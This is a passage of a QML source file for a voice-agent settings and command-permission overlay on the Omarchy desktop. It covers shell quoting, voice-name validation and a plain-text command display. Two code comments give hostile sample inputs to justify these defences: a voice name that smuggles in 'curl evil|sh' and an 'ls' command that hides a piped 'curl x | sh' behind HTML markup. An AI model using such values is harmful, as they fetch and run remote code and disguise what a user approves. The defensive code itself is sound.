import Quickshell
import Quickshell.Io
import Quickshell.Wayland
import QtQuick
import QtQuick.Controls as QQC
import qs.Commons
// Namespaced as well: on Qt 6.12 a bare `Color` resolves to QtQuick's own
// value-type helper, not to the theme, and every colour read through it was
// undefined. Omarchy's own QML writes Commons.Color for the same reason.
import qs.Commons as Commons
import qs.Ui

// Agent Voice settings, as a themed overlay.
//
// The bar panel is for glancing at state; this is for changing things. Nine
// knobs in a popup anchored to a 26px bar icon was too cramped to read, and
// the knobs that matter are ones you set once rather than watch.
//
// Every value persists through `omarchy bar set duaneoca.agentvoice <key>`,
// which writes the widget's entry in shell.json -- the same file the daemon
// watches, so a change lands on the next utterance without a restart.
Item {
  id: root

  property var shell: null
  property var manifest: null
  property bool opened: false

  // The plugin gets one overlay entry point, so this file is both the settings
  // screen and the permission prompt. The summon payload picks.
  property string mode: "settings"
  property var request: ({})
  property int secondsLeft: 0
  // True once a verdict has been written for the request on screen, so
  // closing the card does not write a second one.
  property bool answered: false

  // Shares the [menu] surface tokens, so themes that style the menu style
  // this too.
  property color background: Commons.Color.menu.background
  property color foreground: Commons.Color.menu.text
  property color borderColor: Commons.Color.menu.border
  property var borderSpec: Border.surfaceSpec("menu", "border", borderColor, Math.max(1, Style.space(2)))
  property color scrim: Commons.Color.menu.scrim
  readonly property color dim: Qt.darker(foreground, 1.5)
  property string fontFamily: Style.font.menuFamily

  // --- live daemon state, for the level meter -------------------------------
  property real levelDb: -99
  property string vState: "off"

  // --- settings, read from shell.json via the CLI ---------------------------
  // An overlay is not a bar widget, so it has no `settings` property injected.
  // Reading shell.json directly keeps one source of truth.
  property var cfg: ({})
  function setting(key, fallback) {
    var v = cfg[key]
    return v === undefined || v === null ? fallback : v
  }

  readonly property var phraseOptions: [
    "hey computer", "okay computer", "hey agent", "hey claude", "okay claude",
    "hey assistant", "hey jarvis", "hey machine", "computer"
  ]
  // The four that ship in the wheel, plus anything the user has trained into
  // ~/.local/share/agentvoice/wakewords/. A custom model is the only way to
  // get a phrase openWakeWord was not shipped with.
  property var customModels: []
  readonly property var owwOptions: [
    { label: "hey jarvis",  value: "hey_jarvis" },
    { label: "alexa",       value: "alexa" },
    { label: "hey mycroft", value: "hey_mycroft" },
    { label: "hey marvin",  value: "hey_marvin" }
  ].concat(customModels)
  // Whether openWakeWord is in the environment at all. install.sh does not
  // install it unless asked (--oww): the default engine is Vosk and the daemon
  // falls back to it if openWakeWord is chosen and missing. That fallback is
  // silent from here, though, so the settings would offer an engine that
  // cannot run and then show its model picker, threshold and verifier while
  // Vosk was actually listening. Same failure as offering a voice that is not
  // downloaded, and found by asking the same question of it.
  property bool owwAvailable: true
  Process {
    id: scanOww
    command: ["bash", "-c",
      "d=\"${XDG_DATA_HOME:-$HOME/.local/share}/agentvoice/venv\"; " +
      "compgen -G \"$d/lib/python*/site-packages/openwakeword\" >/dev/null " +
      "&& echo yes || echo no"]
    stdout: StdioCollector {
      onStreamFinished: root.owwAvailable = String(text).trim() === "yes"
    }
  }

  readonly property var engineOptions: [
    { label: "Vosk — any phrase, weaker rejection", value: "vosk" },
    { label: root.owwAvailable
               ? "openWakeWord — four phrases, better rejection"
               : "openWakeWord — four phrases, better rejection  (not installed)",
      value: "openwakeword" }
  ]
  // Which voices are actually on disk. install.sh fetches one by default
  // and the one the settings ask for; the rest are 60MB each and arrive
  // only if chosen. Offering all six without saying which are present let
  // someone pick a voice that does not exist, and the only symptom was
  // silence with the reason in a log.
  property var voicesOnDisk: []
  Process {
    id: scanVoices
    command: ["bash", "-c",
      "d=\"${XDG_DATA_HOME:-$HOME/.local/share}/agentvoice/models/piper\"; " +
      "[ -d \"$d\" ] && for f in \"$d\"/en_US-*.onnx; do " +
      "[ -e \"$f\" ] && basename \"$f\" .onnx | sed 's/^en_US-//'; done || true"]
    stdout: StdioCollector {
      onStreamFinished: {
        var out = []
        var lines = String(text).trim().split("\n")
        for (var i = 0; i < lines.length; i++)
          if (lines[i].trim() !== "") out.push(lines[i].trim())
        root.voicesOnDisk = out
      }
    }
  }

  function voiceLabel(label, value) {
    return root.voicesOnDisk.indexOf(value) >= 0 ? label
                                                 : label + "  (not downloaded)"
  }

  readonly property var rawVoiceOptions: [
    { label: "Lessac — female, medium", value: "lessac-medium" },
    { label: "Lessac — female, low",    value: "lessac-low" },
    { label: "Amy — female, medium",    value: "amy-medium" },
    { label: "Ryan — male, medium",     value: "ryan-medium" },
    { label: "Joe — male, medium",      value: "joe-medium" },
    { label: "HFC — male, medium",      value: "hfc_male-medium" }
  ]

  readonly property var voiceOptions: {
    var out = []
    for (var i = 0; i < root.rawVoiceOptions.length; i++) {
      var v = root.rawVoiceOptions[i]
      out.push({ label: root.voiceLabel(v.label, v.value), value: v.value })
    }
    return out
  }
  readonly property var modelOptions: ["tiny.en", "base.en", "small.en"]

  readonly property bool conversation: setting("conversationMode", true)
  readonly property bool yieldToRecorders: setting("yieldToRecorders", true)
  readonly property bool logSpeech: setting("logSpeech", false)
  // Published by the daemon, because what a level means depends on what the
  // running agent can honour and only the daemon knows that.
  property string vAgent: ""
  property string permissionLevel: "ask"
  property string vPosture: ""
  property var agentLevels: ["ask", "trusted"]
  property bool vRemembers: true
  property string vOverriding: ""
  property bool vGoverned: true
  property bool vVerifier: false
  property bool vTakesModel: false

  // The phrase actually being listened for. Both engines keep their own
  // key and the inactive one stays in shell.json, so reading the raw
  // setting would name a phrase nothing is listening for.
  readonly property string activePhrase:
    root.usingOww ? String(root.setting("owwModel", "hey_jarvis")).replace(/_/g, " ")
                  : String(root.setting("phrase", "hey computer"))
  readonly property string projectDir: setting("projectDir", "")

  // Levels are stored per agent: trust is a judgement about one program's
  // capabilities, and letting it survive `omarchy default agent` would hand
  // the next one a decision nobody made about it.
  function setLevel(value) {
    var all = {}
    var current = cfg["permissions"]
    if (current && typeof current === "object")
      for (var k in current) all[k] = current[k]
    if (root.vAgent === "") return
    all[root.vAgent] = value
    persist("permissions", JSON.stringify(all), true)
  }

  // Per agent, like the level: a model name means something to one CLI and
  // nothing to the next, so it must not follow `omarchy default agent`.
  function agentModel() {
    var all = cfg["agentModels"]
    if (!all || typeof all !== "object" || root.vAgent === "") return ""
    var v = all[root.vAgent]
    return typeof v === "string" ? v : ""
  }

  function setModel(value) {
    var all = {}
    var current = cfg["agentModels"]
    if (current && typeof current === "object")
      for (var k in current) all[k] = current[k]
    if (root.vAgent === "") return
    var v = String(value).trim()
    if (v === "") delete all[root.vAgent]
    else all[root.vAgent] = v
    persist("agentModels", JSON.stringify(all), true)
  }

  function levelOption(value) {
    if (value === "trusted") return { label: "Trust everything here", value: "trusted" }
    if (value === "edits") return { label: "Edits here are fine, ask for commands", value: "edits" }
    return { label: root.agentLevels.indexOf("edits") >= 0
                    ? "Ask before every change" : "Read-only, never act unasked",
             value: "ask" }
  }
  readonly property var levelOptions: {
    var out = []
    for (var i = 0; i < root.agentLevels.length; i++)
      out.push(levelOption(String(root.agentLevels[i])))
    return out
  }
  // The model dropdown. Known aliases per agent, then whatever custom name is
  // already saved (so it stays selectable), then "Other…" for typing one.
  // "Other…" is a local UI state, never persisted: picking it only reveals
  // the text box, and the model changes when a name is typed there.
  readonly property var modelPresets: ({
    "claude": [
      { label: "Fable — most capable", value: "fable" },
      { label: "Opus", value: "opus" },
      { label: "Sonnet", value: "sonnet" },
      { label: "Haiku — fastest", value: "haiku" }
    ]
  })
  property bool customModel: false
  readonly property var agentModelOptions: {
    var cur = root.agentModel()
    var out = [{ label: "Default  (whatever " + (root.vAgent || "the agent") +
                        " uses on its own)", value: "" }]
    var presets = root.modelPresets[root.vAgent] || []
    var known = cur === ""
    for (var i = 0; i < presets.length; i++) {
      out.push(presets[i])
      if (presets[i].value === cur) known = true
    }
    if (!known) out.push({ label: cur + "  (custom)", value: cur })
    out.push({ label: "Other…", value: "__other__" })
    return out
  }
  onVAgentChanged: customModel = false

  readonly property bool speakReplies: setting("speakReplies", true)
  readonly property bool chimes: setting("chimes", true)
  readonly property bool keepHistory: setting("keepHistory", true)
  readonly property string engine: setting("engine", "vosk")
  readonly property bool usingOww: engine === "openwakeword"
  // Selected *and* able to run. The daemon falls back to Vosk when
  // openWakeWord is chosen and not installed, so every control that only
  // makes sense while openWakeWord is really listening keys off this, not
  // off the setting -- otherwise the page describes an engine that is not
  // running.
  readonly property bool owwLive: usingOww && owwAvailable

  function open(payloadJson) {
    mode = "settings"
    var wanted = ""
    try {
      var p = JSON.parse(payloadJson || "{}")
      if (p.mode === "permission") mode = "permission"
      if (p.mode === "history") mode = "history"
      if (p.id) wanted = String(p.id)
    } catch (e) {}

    opened = true
    if (mode === "permission") {
      // Reset, both of them. `request` held the previous question until the
      // probe came back, and `secondsLeft` held the previous countdown --
      // so the card could open showing a stale command with a stale number
      // beside it, which is the one thing a consent prompt must not do.
      request = ({})
      secondsLeft = 0
      answered = false
      // Asked for by id. The hook names the request it is summoning us
      // about, and taking "the newest" instead meant that a second question
      // arriving first put the wrong command on screen above the wrong
      // Allow button.
      pendingProbe.command = wanted ? ["agentvoice", "pending", wanted]
                                    : ["agentvoice", "pending"]
      pendingProbe.running = true
    } else {
      showPage(mode)
    }
  }

  // Between the settings and the conversation, from the link in the header
  // as well as from open(). Not to or from a permission prompt: that card is
  // a question with a countdown, and wandering off it is not an answer.
  function showPage(page) {
    mode = page
    cfgReload.running = true
    stateFile.reload()
    if (page === "history") {
      historyFile.reload()
      historyList.following = true
      Qt.callLater(historyList.positionViewAtEnd)
    } else {
      scanCustom.running = true
      scanVoices.running = true
      scanOww.running = true
    }
  }

  // --- the conversation -------------------------------------------------------
  // This session's exchanges, from the file the daemon appends to as each turn
  // ends (runtime.History): tmpfs, 0600, gone at logout. Read here directly,
  // the way the state file is, rather than through the CLI.

  ListModel { id: historyModel }

  // What has already been turned into rows. A new turn only ever appends to
  // the file, so only the lines past this are parsed and added -- rebuilding
  // the list on every turn would throw away wherever you had scrolled to.
  property string historyRaw: ""

  function historyEntry(e) {
    // One shape for every row: a ListModel takes its roles' types from the
    // first row it is given, and a later row with a field missing or of
    // another type would quietly lose it.
    return {
      at: Number(e.at) || 0,
      agent: String(e.agent || ""),
      transcript: String(e.transcript || ""),
      reply: String(e.reply || ""),
      failed: String(e.error || ""),
      stopped: e.stopped === true,
      fresh: e["new"] === true,
      latency: Number(e.latency_ms) || 0
    }
  }

  function syncHistory(raw) {
    raw = String(raw || "")
    // Whole lines only: a read that lands mid-write sees the start of one,
    // and it is picked up complete on the next read.
    raw = raw.slice(0, raw.lastIndexOf("\n") + 1)
    if (raw === root.historyRaw) return
    var from = 0
    if (root.historyRaw !== "" && raw.indexOf(root.historyRaw) === 0) {
      from = root.historyRaw.length
    } else {
      // Cleared, or trimmed to its last turns: start again.
      historyModel.clear()
    }
    root.historyRaw = raw
    var lines = raw.slice(from).split("\n")
    for (var i = 0; i < lines.length; i++) {
      var line = lines[i].trim()
      if (line === "") continue
      try {
        var e = JSON.parse(line)
        if (e && typeof e === "object") historyModel.append(root.historyEntry(e))
      } catch (err) {}
    }
  }

  FileView {
    id: historyFile
    path: (Quickshell.env("XDG_RUNTIME_DIR") || "/run/user/1000") + "/agentvoice/history.jsonl"
    watchChanges: true
    printErrors: false
    onFileChanged: historyFile.reload()
    onLoaded: root.syncHistory(historyFile.text())
    // No file: nothing kept yet, or just cleared.
    onLoadFailed: root.syncHistory("")
  }

  // A file that did not exist when the watch was set never gets one -- the
  // first turn of a session creates it -- so while the page is open it is
  // read again on a timer as well. The same recovery the state file needs.
  Timer {
    interval: 1500
    running: root.opened && root.mode === "history"
    repeat: true
    onTriggered: historyFile.reload()
  }

  // Two presses, a few seconds apart, because it cannot be undone.
  property bool confirmClear: false
  Timer {
    id: clearTimeout
    interval: 4000
    onTriggered: root.confirmClear = false
  }
  Process {
    id: clearHistory
    command: ["agentvoice", "history", "clear"]
    onExited: historyFile.reload()
  }

  function timeOf(at) {
    return at > 0 ? Qt.formatTime(new Date(at * 1000), "h:mm AP") : ""
  }

  // Closed the moment the screen locks. This is a layer-shell surface, and
  // the HUD's own notes say those draw over the lock screen -- which with
  // this page open would put the whole session's conversation above a
  // locked machine.
  onVStateChanged: if (vState === "locked" && opened && mode === "history") close()

  function answer(verdict) {
    if (!request || !request.id) { close(); return }
    permit.command = ["agentvoice", "permit", String(request.id), verdict]
    permit.running = true
    answered = true
    dismiss()
  }

  Process { id: permit }

  // The hook writes the request file and only tells us its id; read the rest
  // here so the two do not have to agree on a payload schema.
  Process {
    id: pendingProbe
    stdout: StdioCollector {
      onStreamFinished: {
        try { root.request = JSON.parse(String(text).trim() || "{}") }
        catch (e) { root.request = ({}) }
        if (root.request && root.request.timeout)
          root.secondsLeft = Math.round(root.request.timeout)
      }
    }
  }

  // Silence is a denial, so the countdown is the honest thing to show.
  Timer {
    interval: 1000
    running: root.opened && root.mode === "permission"
    repeat: true
    onTriggered: {
      root.secondsLeft = Math.max(0, root.secondsLeft - 1)
      if (root.secondsLeft <= 0) root.dismiss()
    }
  }
  function close() { opened = false }
  function dismiss() {
    // Esc, or a click outside the card, is an answer: no. It used to be
    // neither -- the card went away and the agent stayed blocked until the
    // timeout, with no way to bring the question back. Silence already
    // means no in the hook, so saying so now only makes it immediate.
    if (mode === "permission" && !answered && request && request.id) {
      answer("deny")
      return
    }
    if (shell && typeof shell.hide === "function")
      shell.hide((manifest && manifest.id) || "duaneoca.agentvoice")
    else close()
  }

  // Single-quote one argument for a shell. The launcher takes a command
  // line, not an argv: it does `cmd="$*"` and runs `bash -c "$cmd"`. So
  // everything handed to it is shell source, and an unquoted $HOME with a
  // space in it, or a voice name of `x;curl evil|sh`, is a command.
  function shq(s) {
    return "'" + String(s).replace(/'/g, "'\\''") + "'"
  }

  readonly property string configHome:
      Quickshell.env("XDG_CONFIG_HOME")
      || ((Quickshell.env("HOME") || "") + "/.config")
  readonly property string dataHome:
      Quickshell.env("XDG_DATA_HOME")
      || ((Quickshell.env("HOME") || "") + "/.local/share")

  // Run the installer for something chosen here that is not on the machine.
  // Choosing is the request -- a separate button to confirm it was a step
  // nobody looked for. Arguments are passed explicitly rather than read back
  // out of settings, because `omarchy bar set` has not necessarily landed by
  // the time this runs. `args` is an array, and every element is quoted.
  function fetchNow(args) {
    var cmd = shq(root.configHome
                  + "/omarchy/plugins/duaneoca.agentvoice/install.sh")
    var argv = ["--no-keybinds"].concat(args)
    for (var i = 0; i < argv.length; i++) cmd += " " + shq(argv[i])
    fetcher.command = ["omarchy-launch-floating-terminal-with-presentation", cmd]
    fetcher.running = true
    root.dismiss()
  }

  // A Piper voice name, and nothing else, may become part of that command
  // line. shell.json is written by this screen, by `omarchy bar set`, by a
  // dotfile sync and by hand, so the value arriving here is not necessarily
  // one this screen ever offered. Quoting alone would be enough; checking
  // the shape as well means a junk value fails visibly rather than running.
  function fetchVoice(v) {
    if (!/^[a-z][a-z0-9_]*-(x_low|low|medium|high)$/.test(String(v))) return
    root.fetchNow(["--voice=" + v])
  }

  Process { id: fetcher }

  function persist(key, value, json) {
    setter.command = ["omarchy", "bar", "set", "duaneoca.agentvoice",
                      key, String(value)].concat(json ? ["--json"] : [])
    setter.running = true
  }

  Process {
    id: setter
    onExited: cfgReload.running = true
  }

  // shell.json changes from more than one place: this screen, the panel's own
  // switch, `omarchy bar set`, and a refresh. This screen only re-read it when
  // it was opened or when it wrote, so anything changed underneath an open
  // screen stayed invisible here while the panel -- which the bar updates live
  // -- showed the new value. The two then disagreed, which is exactly the kind
  // of thing a settings screen must never do about permissions.
  FileView {
    id: cfgFile
    path: (Quickshell.env("XDG_CONFIG_HOME")
           || ((Quickshell.env("HOME") || "") + "/.config")) + "/omarchy/shell.json"
    watchChanges: true
    printErrors: false
    onFileChanged: {
      cfgFile.reload()
      cfgReload.running = true
    }
  }

  // shell.json is the store; jq pulls out just this widget's entry.
  Process {
    id: cfgReload
    command: ["bash", "-c",
      "jq -c '[.bar.layout[]?[]? | select(.id==\"duaneoca.agentvoice\")][0] // {}' " +
      "\"${XDG_CONFIG_HOME:-$HOME/.config}/omarchy/shell.json\" 2>/dev/null || echo '{}'"]
    stdout: StdioCollector {
      onStreamFinished: {
        try { root.cfg = JSON.parse(String(text).trim() || "{}") }
        catch (e) { root.cfg = ({}) }
      }
    }
  }

  Process { id: trainer }

  // Custom .onnx wake models the user has trained and dropped in.
  Process {
    id: scanCustom
    command: ["bash", "-c",
      "d=\"${XDG_DATA_HOME:-$HOME/.local/share}/agentvoice/wakewords\"; " +
      "[ -d \"$d\" ] && for f in \"$d\"/*.onnx; do " +
      "[ -e \"$f\" ] && basename \"$f\" .onnx; done || true"]
    stdout: StdioCollector {
      onStreamFinished: {
        var out = []
        var lines = String(text).trim().split("\n")
        for (var i = 0; i < lines.length; i++) {
          var name = lines[i].trim()
          if (name !== "") out.push({ label: name.replace(/_/g, " ") + "  (yours)", value: name })
        }
        root.customModels = out
      }
    }
  }

  // Same recovery as the panel: a first install has no state file to watch,
  // so the watch never attaches and the screen never updates. A sibling of
  // the FileView, not a child -- its default property takes an adapter.
  Timer {
    interval: 2000
    running: root.opened && root.vState === "off"
    repeat: true
    onTriggered: stateFile.reload()
  }

  FileView {
    id: stateFile
    path: (Quickshell.env("XDG_RUNTIME_DIR") || "/run/user/1000") + "/agentvoice/state"
    watchChanges: true
    printErrors: false
    onFileChanged: stateFile.reload()
    onLoadFailed: root.vState = "off"
    onLoaded: {
      try {
        var d = JSON.parse(text())
        root.vState = String(d.state || "off")
        if (d.level_db !== undefined) root.levelDb = d.level_db
        if (d.agent !== undefined) root.vAgent = String(d.agent)
        if (d.level !== undefined) root.permissionLevel = String(d.level)
        if (d.posture !== undefined) root.vPosture = String(d.posture)
        if (d.levels !== undefined) root.agentLevels = d.levels
        if (d.remembers !== undefined) root.vRemembers = (d.remembers === true)
        if (d.overriding !== undefined) root.vOverriding = String(d.overriding)
        if (d.governed !== undefined) root.vGoverned = (d.governed === true)
        if (d.verifier !== undefined) root.vVerifier = (d.verifier === true)
        if (d.takes_model !== undefined) root.vTakesModel = (d.takes_model === true)
      } catch (e) {}
    }
  }

  PanelWindow {
    id: window
    visible: root.opened
    color: "transparent"
    WlrLayershell.namespace: "agentvoice-settings"
    WlrLayershell.layer: WlrLayer.Overlay
    WlrLayershell.keyboardFocus: WlrKeyboardFocus.Exclusive
    exclusionMode: ExclusionMode.Ignore
    anchors { top: true; bottom: true; left: true; right: true }

    // Click-away closes, same as every other Omarchy overlay.
    MouseArea {
      anchors.fill: parent
      onClicked: root.dismiss()
    }

    Rectangle {
      anchors.fill: parent
      color: root.scrim
    }

    // BorderSurface *is* the card -- it draws the themed border itself, the
    // way every shipped overlay uses it.
    BorderSurface {
      id: card
      anchors.centerIn: parent
      // The conversation gets more room than the settings: it is text to
      // read, and the whole point of it was that the popup had too little.
      width: Math.min(Style.space(root.mode === "history" ? 680 : 560),
                      parent.width - Style.gapsOut * 2)
      height: root.mode === "permission"
              ? Math.min(Style.space(300), parent.height - Style.gapsOut * 2)
              : root.mode === "history"
                ? Math.min(Style.space(760), parent.height - Style.gapsOut * 2)
                : Math.min(Style.space(660), parent.height - Style.gapsOut * 2)
      radius: Style.cornerRadius
      color: root.background
      borderSpec: root.borderSpec

      // Swallow clicks so they don't reach the dismiss handler behind.
      MouseArea { anchors.fill: parent }

      Keys.onEscapePressed: root.dismiss()
      focus: root.opened

      Column {
        id: body
        anchors.fill: parent
        anchors.margins: Style.spacing.panelPadding
        spacing: Style.spacing.md

        Row {
          width: parent.width
          spacing: Style.space(12)
          Text {
            text: root.mode === "permission" ? "Allow this?"
                  : root.mode === "history" ? "Conversation" : "Agent Voice"
            color: root.mode === "permission" ? Commons.Color.urgent : root.foreground
            font.family: root.fontFamily
            font.pixelSize: Style.font.title
            font.bold: true
            width: parent.width - hint.width - parent.spacing
                   - (switcher.visible ? switcher.width + parent.spacing : 0)
          }
          // The other page. Not on a permission prompt -- see showPage().
          Text {
            id: switcher
            visible: root.mode !== "permission"
            anchors.verticalCenter: parent.verticalCenter
            text: root.mode === "history" ? "settings ›" : "conversation ›"
            color: root.foreground
            font.family: root.fontFamily
            font.pixelSize: Style.font.caption
            MouseArea {
              anchors.fill: parent
              cursorShape: Qt.PointingHandCursor
              onClicked: root.showPage(root.mode === "history" ? "settings" : "history")
            }
          }
          Text {
            id: hint
            anchors.verticalCenter: parent.verticalCenter
            text: root.mode === "permission"
                  ? "denied in " + root.secondsLeft + "s"
                  : "esc to close"
            color: root.dim
            font.family: root.fontFamily
            font.pixelSize: Style.font.caption
          }
        }

        PanelSeparator { width: parent.width; foreground: root.foreground }

        // --- permission prompt ----------------------------------------
        Column {
          width: parent.width
          spacing: Style.spacing.md
          visible: root.mode === "permission"

          Text {
            width: parent.width
            wrapMode: Text.WordWrap
            text: "The agent wants to run " + (root.request.tool || "a tool") + "."
            textFormat: Text.PlainText
            color: root.foreground
            font.family: root.fontFamily
            font.pixelSize: Style.font.body
          }

          // Why this one is being asked about, when the tool and the path do
          // not say it on their own -- a Read is usually free, so a Read that
          // prompts has a reason worth putting on screen.
          Text {
            width: parent.width
            wrapMode: Text.WordWrap
            visible: (root.request.note || "") !== ""
            text: root.request.note || ""
            textFormat: Text.PlainText
            color: Commons.Color.urgent
            font.family: root.fontFamily
            font.pixelSize: Style.font.caption
          }

          // The command itself, verbatim. Paraphrasing what is about to run
          // would defeat the point of asking -- and so does showing only as
          // much of it as happens to fit, which is why this scrolls: the card
          // is capped in height, and a long command used to be cut off at the
          // bottom edge with nothing to say it had been.
          BorderSurface {
            width: parent.width
            height: Math.min(Style.space(160),
                             Math.max(Style.space(44),
                                      cmd.implicitHeight + Style.space(16)))
            radius: Style.cornerRadius
            color: Qt.darker(root.background, 1.25)
            borderSpec: root.borderSpec

            Flickable {
              id: cmdScroll
              anchors.fill: parent
              anchors.margins: Style.space(8)
              contentWidth: width
              contentHeight: cmd.implicitHeight
              clip: true
              boundsBehavior: Flickable.StopAtBounds
              flickableDirection: Flickable.VerticalFlick
              interactive: contentHeight > height
              QQC.ScrollBar.vertical: QQC.ScrollBar {
                policy: QQC.ScrollBar.AsNeeded
              }

              Text {
                id: cmd
                width: cmdScroll.width
                wrapMode: Text.WrapAnywhere
                text: root.request.summary || "(no detail)"
                // The one Text in this file that must never be rich: it is
                // the command about to run. `ls <b></b><!-- ; curl x | sh -->`
                // renders as `ls` under AutoText, which turns the prompt
                // into a lie about what is being consented to.
                textFormat: Text.PlainText
                color: root.foreground
                font.family: "monospace"
                font.pixelSize: Style.font.caption
              }
            }
          }

          // How much of it there is, since the card shows a window onto it.
          Text {
            width: parent.width
            visible: (root.request.length || 0) > 0
            text: (root.request.length || 0) + " characters"
                  + ((root.request.truncated || 0) > 0
                     ? ", " + root.request.truncated + " of them not shown"
                     : "")
                  + (cmdScroll.contentHeight > cmdScroll.height
                     ? " · scroll to read it all" : "")
            textFormat: Text.PlainText
            color: (root.request.truncated || 0) > 0 ? Commons.Color.urgent : root.dim
            font.family: root.fontFamily
            font.pixelSize: Style.font.caption
          }

          Row {
            width: parent.width
            spacing: Style.spacing.md
            Button {
              text: "Deny"
              fontFamily: root.fontFamily
              onClicked: root.answer("deny")
            }
            Button {
              text: "Allow once"
              fontFamily: root.fontFamily
              onClicked: root.answer("allow")
            }
          }

          Text {
            width: parent.width
            wrapMode: Text.WordWrap
            text: "Doing nothing denies it. Read-only tools are never asked about."
            color: root.dim
            font.family: root.fontFamily
            font.pixelSize: Style.font.caption
          }
        }

        Flickable {
          id: formScroll
          visible: root.mode === "settings"
          width: parent.width
          height: body.height - y - Style.spacing.md
          contentWidth: width
          contentHeight: form.implicitHeight
          clip: true
          boundsBehavior: Flickable.StopAtBounds
          // The configuration every other scrolling panel in Omarchy uses --
          // nine of them attach a ScrollBar, and this one did not. A bare
          // Flickable handles the wheel itself and moves a short, momentum-less
          // step; with a ScrollBar attached the Controls wheel handling applies,
          // which is what those panels feel like. This page was the outlier.
          flickableDirection: Flickable.VerticalFlick
          interactive: contentHeight > height
          // Namespaced: a plain `import QtQuick.Controls` shadows Omarchy's
          // own Button, Toggle and Dropdown with the Controls types of the
          // same names. qs.Ui is imported last so it wins at runtime, but
          // qmllint cannot tell, and neither can a reader.
          QQC.ScrollBar.vertical: QQC.ScrollBar { policy: QQC.ScrollBar.AsNeeded }

          Column {
            id: form
            width: parent.width
            spacing: Style.spacing.md

            // The switch first, because it is the one people reach for, and the
            // duration with it, because the two are one setting described twice:
            // how long it stays governs nothing when it is not shown. Split
            // across the page they were the same mistake as a follow-up window
            // sitting apart from "keep listening after a reply".
            SettingsGroup {
              width: parent.width
              foreground: root.foreground
              fontFamily: root.fontFamily
              title: "ON-SCREEN READOUT"

              Toggle {
                width: parent.width
                label: "Show what it heard and what it answered"
                description: "A panel by the bar while it works, from the wake word " +
                             "until shortly after the answer. It cannot take the " +
                             "keyboard from what you are typing."
                checked: root.setting("hud", true) === true
                foreground: root.foreground
                fontFamily: root.fontFamily
                onClicked: root.persist("hud",
                    root.setting("hud", true) === true ? "false" : "true", true)
              }

              KnobRow {
                width: parent.width
                // The knob hides, not the box: the box holds the switch now, so
                // hiding it would take away the only way to turn the thing back
                // on. Same shape as the follow-up window under "keep listening".
                visible: root.setting("hud", true) === true
                scrollTarget: formScroll
                foreground: root.foreground; fontFamily: root.fontFamily
                label: "How long it stays afterwards"
                unit: "ms"
                description: "Measured from the end of the exchange, including the " +
                             "follow-up window. Zero closes it immediately."
                value: root.setting("hudLingerMs", 2000)
                minimum: 0; maximum: 10000; stepSize: 500
                onCommitted: function(v) { root.persist("hudLingerMs", v, true) }
              }
            }

            // Grouped rather than separated. Ten sections divided by rules had
            // become easy to get lost in, and a rule only says something changed;
            // a box says these belong together -- which matters most where a knob
            // is meaningless without the switch above it.
            SettingsGroup {
              width: parent.width
              foreground: root.foreground
              fontFamily: root.fontFamily
              title: "WHILE YOU INTERACT WITH IT"

              Toggle {
                width: parent.width
                label: "Speak replies aloud"
                description: "Off leaves the reply as text in the panel."
                checked: root.speakReplies
                foreground: root.foreground
                fontFamily: root.fontFamily
                onClicked: root.persist("speakReplies",
                                        root.speakReplies ? "false" : "true", true)
              }

              Toggle {
                width: parent.width
                label: "Sounds for listening, heard and done"
                description: "A rising tone when the wake word lands, a soft " +
                             "one when it has heard the end of what you said, " +
                             "and a chime when a long task finishes -- so you " +
                             "know where it is without looking. Push-to-talk " +
                             "gets no opening tone; the key is the signal."
                checked: root.chimes
                foreground: root.foreground
                fontFamily: root.fontFamily
                onClicked: root.persist("chimes",
                                        root.chimes ? "false" : "true", true)
              }

              Toggle {
                width: parent.width
                label: "Keep this session's conversation"
                description: "Every exchange, for the conversation view -- " +
                             "open it from the panel, or by clicking the " +
                             "readout. Kept in memory only, readable by you " +
                             "alone, and gone when you log out. Off deletes " +
                             "what is already kept."
                checked: root.keepHistory
                foreground: root.foreground
                fontFamily: root.fontFamily
                onClicked: root.persist("keepHistory",
                                        root.keepHistory ? "false" : "true", true)
              }

              Toggle {
                width: parent.width
                label: "Keep listening after a reply"
                description: "Carry on without repeating the wake word. Say " +
                             "\"stop\", \"cancel that\" or \"never mind\" to end it, " +
                             "or just stay quiet."
                checked: root.conversation
                foreground: root.foreground
                fontFamily: root.fontFamily
                onClicked: root.persist("conversationMode",
                                        root.conversation ? "false" : "true", true)
              }

              Toggle {
                width: parent.width
                label: "Step aside when another app records"
                description: "Stop listening while something else is using " +
                             "the microphone -- dictation, a call, a " +
                             "recorder -- and start again when it finishes. " +
                             "Without this, saying the wake phrase while " +
                             "dictating elsewhere makes the agent answer out " +
                             "loud into what you are dictating. Your own mute " +
                             "is untouched either way."
                checked: root.yieldToRecorders
                foreground: root.foreground
                fontFamily: root.fontFamily
                onClicked: root.persist("yieldToRecorders",
                                        root.yieldToRecorders ? "false" : "true",
                                        true)
              }

              Toggle {
                width: parent.width
                label: "Write what is said to the system log"
                description: "Off by default. The journal keeps entries for " +
                             "weeks, so logging replies leaves a transcript " +
                             "of everything the agent read out -- file " +
                             "contents, key names -- sitting there until it " +
                             "rotates. Timings, wake events and errors are " +
                             "always logged; this is only the words. Turn it " +
                             "on to diagnose something."
                checked: root.logSpeech
                foreground: root.foreground
                fontFamily: root.fontFamily
                onClicked: root.persist("logSpeech",
                                        root.logSpeech ? "false" : "true", true)
              }

              // Left on rather than switched off for a backend that forgets:
              // it still saves the wake word, which is half of what it is for.
              // What it cannot do is follow on, and that failure is silent --
              // the window opens, it listens, it answers from nothing.
              Text {
                width: parent.width
                wrapMode: Text.WordWrap
                visible: root.conversation && !root.vRemembers
                text: (root.vAgent === "" ? "This agent" : root.vAgent) +
                      " starts fresh on every turn, so this saves you the wake " +
                      "word and nothing more. Asking \"what did you mean by " +
                      "that?\" will get an answer to a question it has never seen."
                color: Commons.Color.urgent
                font.family: root.fontFamily
                font.pixelSize: Style.font.caption
              }

              KnobRow {
                width: parent.width
                visible: root.conversation
                scrollTarget: formScroll
                foreground: root.foreground; fontFamily: root.fontFamily
                label: "Follow-up window"
                description: "How long it keeps listening after speaking before " +
                             "it needs the wake word again."
                value: root.setting("followUpMs", 7000)
                minimum: 2000; maximum: 20000; stepSize: 500
                onCommitted: function(v) { root.persist("followUpMs", v, true) }
              }
            }

            // The directory and what is allowed in it are one decision, not
            // two: a permission level with no root to apply to means nothing,
            // and changing where the agent works without revisiting what it
            // may do there is how you end up trusting the wrong folder.
            Text {
              width: parent.width
              wrapMode: Text.WordWrap
              visible: !root.vGoverned
              text: "⚠  Not in use right now. The endpoint answering works on " +
                    "its own machine, in a directory it chooses — these two " +
                    "settings govern an agent started here, and reach nothing " +
                    "over there. Restrain that one where it runs."
              color: Commons.Color.urgent
              font.family: root.fontFamily
